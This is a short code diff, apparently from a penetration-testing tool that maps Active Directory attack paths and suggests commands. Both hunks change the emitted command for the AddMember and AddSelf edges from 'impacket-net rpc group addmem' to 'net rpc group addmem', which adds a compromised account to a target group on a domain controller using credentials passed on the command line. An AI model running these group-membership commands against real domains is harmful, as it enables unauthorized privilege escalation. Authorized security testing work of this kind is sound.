@@ -958,7 +958,7 @@ def run(report, store, ui=None):
                     f"AddMember: {actor} -> group {tgt}",
                     crit=6, conf=0.7, ready=1.3, prox=0.8,
                     commands=[
-                        f"impacket-net rpc group addmem '{tgt}' '{_owned}' "
+                        f"net rpc group addmem '{tgt}' '{_owned}' "
                         f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddAllowedToAct":
@@ -1014,7 +1014,7 @@ def run(report, store, ui=None):
                     f"AddSelf: {actor} -> group {tgt}",
                     crit=6, conf=0.75, ready=1.3, prox=0.8,       # score 4.68
                     commands=[
-                        f"impacket-net rpc group addmem '{tgt}' '{_owned}' "
+                        f"net rpc group addmem '{tgt}' '{_owned}' "
                         f"-U '{_dom_e}/{_owned}%{_owned_pw}' -S {_dc_e}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "Owns":
